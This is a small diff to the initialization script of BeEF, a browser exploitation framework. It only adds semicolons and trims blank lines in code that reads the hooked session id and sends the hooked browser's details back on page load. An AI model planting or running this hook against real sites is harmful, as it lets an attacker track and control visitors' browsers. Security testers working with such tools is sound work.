@@ -18,7 +18,7 @@
 // and will have a new session id. The new session id will need to know
 // the brwoser details. So sendback the browser details again.
 
-BEEFHOOK = beef.session.get_hook_session_id()
+BEEFHOOK = beef.session.get_hook_session_id();
 
 if (beef.pageIsLoaded) {
     beef.net.browser_details();
@@ -26,7 +26,7 @@ if (beef.pageIsLoaded) {
 
 window.onload = function () {
     beef_init();
-}
+};
 
 window.onpopstate = function (event) {
     if (beef.onpopstate.length > 0) {
@@ -41,7 +41,7 @@ window.onpopstate = function (event) {
             return false;
         }
     }
-}
+};
 
 window.onclose = function (event) {
     if (beef.onclose.length > 0) {
@@ -56,7 +56,7 @@ window.onclose = function (event) {
             return false;
         }
     }
-}
+};
 
 function beef_init() {
     if (!beef.pageIsLoaded) {
@@ -76,6 +76,4 @@ function beef_init() {
         }
 
     }
-
-
 }
